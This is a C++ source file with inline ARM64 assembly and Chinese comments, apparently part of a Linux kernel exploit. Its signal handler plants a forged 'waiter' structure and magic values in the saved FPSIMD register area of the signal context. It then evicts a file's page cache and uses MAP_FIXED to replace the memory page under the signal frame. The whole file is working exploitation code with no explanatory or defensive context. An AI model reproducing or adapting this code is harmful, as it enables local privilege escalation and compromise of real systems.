#include "sig_handler.h"
#include <cstdint>
#include <cstring>
#include <atomic>
#include <fcntl.h>
#include <asm/sigcontext.h>
#include <sys/mman.h>
#include "../const.h"
#include "../tools.h"
#include <algorithm>
// 手写汇编入口：只剩「框架」，逻辑全在 l11_body 里
unsigned char mystack[0x10000] __attribute__((aligned(16)));
unsigned long handler_stack = (unsigned long)mystack + sizeof(mystack);
asm(
    R"(
        .text
        .global l11_tramp
    l11_tramp:
        mov x19, sp
        ldr x9, =handler_stack
        ldr x9, [x9]
        mov sp, x9
        bl  l11_body
        mov sp, x19
        mov x8, #139
        svc #0
        brk #0
    )"//brk不该走到，用于调试
);

// 在 ucontext 里找 fpsimd 记录
unsigned long *find_vregs(char *ucp) {
    for (int i = 0; i <= 0x800; i += 4) {
        unsigned int magic = 0;
        memcpy(&magic, ucp + i, 4);
        if (magic != FPSIMD_MAGIC) continue;
        return (unsigned long *)(ucp + i + VREGS_OFF);
    }
    pstr("[handler] 没找到fpsimd魔数\n");
    _exit(1);
}

extern "C" void l11_body(void*, void*, void *ucp) {
    //注意信号handler只能用自定义输出函数
    sigframe = (unsigned long)ucp - FRAME_OFF;
    if (check_mode) return;
    //铺伪waiter
    unsigned long *v = find_vregs((char*)ucp);
    std::fill_n(v, 512 / 8, 0xBAB1D011BAB1D011);//其余字节填魔数
    memcpy(v + WAITER_IDX, WAITER.data(), WAITER.size()*8);
    // 打掉低页：先丢文件页缓存，再用 MAP_FIXED 换掉映射
    auto fa = posix_fadvise(store_fd, 0x1000, 0x1000, POSIX_FADV_DONTNEED);
    if (fa != 0) {
        pstr("[handler] fadvise 失败 "); pstr(strerror(fa));
        _exit(1);
    }
    auto low = sigframe & ~0xFFFUL;
    void *r = mmap((void *)low, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_FIXED, store_fd, 0x1000);
    if (r == MAP_FAILED) {
        pstr("[handler] 低页 MAP_FIXED 失败 "); pstr(strerror(errno));
        _exit(1);
    }
    w_done = true;
    //这之后不能打印
}
